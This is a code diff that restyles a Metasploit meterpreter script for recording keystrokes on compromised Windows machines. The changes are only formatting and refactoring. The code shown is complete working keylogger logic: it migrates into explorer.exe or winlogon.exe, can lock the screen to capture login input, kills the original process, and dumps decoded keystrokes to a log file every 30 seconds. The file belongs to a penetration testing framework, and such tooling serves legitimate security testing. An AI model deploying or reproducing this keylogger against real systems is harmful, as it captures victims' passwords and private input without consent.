@@ -1,10 +1,9 @@
+# frozen_string_literal: true
 ##
 # WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
-
-
 
 # Author: Carlos Perez at carlos_perez[at]darkoperator.com
 # Updates by Shellster
@@ -26,9 +25,9 @@ def usage
   raise Rex::Script::Completed
 end
 
-
-#Get Hostname
-host,port = session.session_host, session.session_port
+# Get Hostname
+host = session.session_host
+port = session.session_port
 
 # Create Filename info to be appended to downloaded files
 filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
@@ -39,13 +38,13 @@ logs = ::File.join(Msf::Config.log_directory, 'scripts', 'keylogrecorder')
 # Create the log directory
 ::FileUtils.mkdir_p(logs)
 
-#logfile name
+# logfile name
 logfile = logs + ::File::Separator + host + filenameinfo + ".txt"
 
-#Interval for collecting Keystrokes in seconds
+# Interval for collecting Keystrokes in seconds
 keytime = 30
 
-#Type of capture
+# Type of capture
 captype = 2
 # Function for locking the screen -- Thanks for the idea and API call Mubix
 def lock_screen
@@ -57,9 +56,10 @@ def lock_screen
     print_error("Screen lock Failed")
   end
 end
-#Function to Migrate in to Explorer process to be able to interact with desktop
-def explrmigrate(session,captype,lock,kill)
-  #begin
+
+# Function to Migrate in to Explorer process to be able to interact with desktop
+def explrmigrate(session, captype, lock, kill)
+  # begin
   if captype.to_i == 0
     process2mig = "explorer.exe"
   elsif captype.to_i == 1
@@ -68,53 +68,47 @@ def explrmigrate(session,captype,lock,kill)
       raise Rex::Script::Completed
     end
     process2mig = "winlogon.exe"
-    if lock
-      lock_screen
-    end
+    lock_screen if lock
   else
     process2mig = "explorer.exe"
   end
   # Actual migration
   mypid = session.sys.process.getpid
-  session.sys.process.get_processes().each do |x|
-    if (process2mig.index(x['name'].downcase) and x['pid'] != mypid)
-      print_status("\t#{process2mig} Process found, migrating into #{x['pid']}")
-      session.core.migrate(x['pid'].to_i)
-      print_status("Migration Successful!!")
+  session.sys.process.get_processes.each do |x|
+    next unless process2mig.index(x['name'].downcase) && (x['pid'] != mypid)
+    print_status("\t#{process2mig} Process found, migrating into #{x['pid']}")
+    session.core.migrate(x['pid'].to_i)
+    print_status("Migration Successful!!")
 
-      if (kill)
-        begin
-          print_status("Killing old process")
-          client.sys.process.kill(mypid)
-          print_status("Old process killed.")
-        rescue
-          print_status("Failed to kill old process.")
-        end
-      end
+    next unless kill
+    begin
+      print_status("Killing old process")
+      client.sys.process.kill(mypid)
+      print_status("Old process killed.")
+    rescue
+      print_status("Failed to kill old process.")
     end
   end
-  return true
+  true
   #	rescue
   #		print_status("Failed to migrate process!")
   #		return false
   #	end
 end
 
-#Function for starting the keylogger
+# Function for starting the keylogger
 def startkeylogger(session)
-  begin
-    #print_status("Grabbing Desktop Keyboard Input...")
-    #session.ui.grab_desktop
-    print_status("Starting the keystroke sniffer...")
-    session.ui.keyscan_start
-    return true
-  rescue
-    print_status("Failed to start Keylogging!")
-    return false
-  end
+  # print_status("Grabbing Desktop Keyboard Input...")
+  # session.ui.grab_desktop
+  print_status("Starting the keystroke sniffer...")
+  session.ui.keyscan_start
+  return true
+rescue
+  print_status("Failed to start Keylogging!")
+  return false
 end
 
-def write_keylog_data session, logfile
+def write_keylog_data(session, logfile)
   data = session.ui.keyscan_dump
   outp = ""
   data.unpack("n*").each do |inp|
@@ -122,12 +116,12 @@ def write_keylog_data session, logfile
     vk = (inp & 0xff)
     kc = VirtualKeyCodes[vk]
 
-    f_shift = fl & (1<<1)
-    f_ctrl  = fl & (1<<2)
-    f_alt   = fl & (1<<3)
+    f_shift = fl & (1 << 1)
+    f_ctrl  = fl & (1 << 2)
+    f_alt   = fl & (1 << 3)
 
-    if(kc)
-      name = ((f_shift != 0 and kc.length > 1) ? kc[1] : kc[0])
+    if kc
+      name = ((f_shift != 0) && kc.length > 1 ? kc[1] : kc[0])
       case name
       when /^.$/
         outp << name
@@ -144,36 +138,32 @@ def write_keylog_data session, logfile
 
   sleep(2)
 
-  if(outp.length > 0)
-    file_local_write(logfile,"#{outp}\n")
-  end
+  file_local_write(logfile, "#{outp}\n") unless outp.empty?
 end
 
 # Function for Collecting Capture
 def keycap(session, keytime, logfile)
-  begin
-    rec = 1
-    #Creating DB for captured keystrokes
-    file_local_write(logfile,"")
+  rec = 1
+  # Creating DB for captured keystrokes
+  file_local_write(logfile, "")
 
-    print_status("Keystrokes being saved in to #{logfile}")
-    #Inserting keystrokes every number of seconds specified
-    print_status("Recording ")
-    while rec == 1
-      #getting and writing Keystrokes
-      write_keylog_data session, logfile
-
-      sleep(keytime.to_i)
-    end
-  rescue::Exception => e
-    print_status "Saving last few keystrokes"
+  print_status("Keystrokes being saved in to #{logfile}")
+  # Inserting keystrokes every number of seconds specified
+  print_status("Recording ")
+  while rec == 1
+    # getting and writing Keystrokes
     write_keylog_data session, logfile
 
-    print("\n")
-    print_status("#{e.class} #{e}")
-    print_status("Stopping keystroke sniffer...")
-    session.ui.keyscan_stop
+    sleep(keytime.to_i)
   end
+rescue ::Exception => e
+  print_status "Saving last few keystrokes"
+  write_keylog_data session, logfile
+
+  print("\n")
+  print_status("#{e.class} #{e}")
+  print_status("Stopping keystroke sniffer...")
+  session.ui.keyscan_stop
 end
 
 # Parsing of Options
@@ -182,7 +172,7 @@ helpcall = 0
 lock = false
 kill = false
 
-@@exec_opts.parse(args) { |opt, idx, val|
+@@exec_opts.parse(args) do |opt, _idx, val|
   case opt
   when "-t"
     keytime = val
@@ -195,16 +185,12 @@ kill = false
   when "-k"
     kill = true
   end
-}
+end
 if client.platform =~ /win32|win64/
-  if (captype.to_i == 2)
-    if startkeylogger(session)
-      keycap(session, keytime, logfile)
-    end
-  elsif explrmigrate(session,captype,lock, kill)
-    if startkeylogger(session)
-      keycap(session, keytime, logfile)
-    end
+  if captype.to_i == 2
+    keycap(session, keytime, logfile) if startkeylogger(session)
+  elsif explrmigrate(session, captype, lock, kill)
+    keycap(session, keytime, logfile) if startkeylogger(session)
   end
 else
   print_error("This version of Meterpreter is not supported with this Script!")
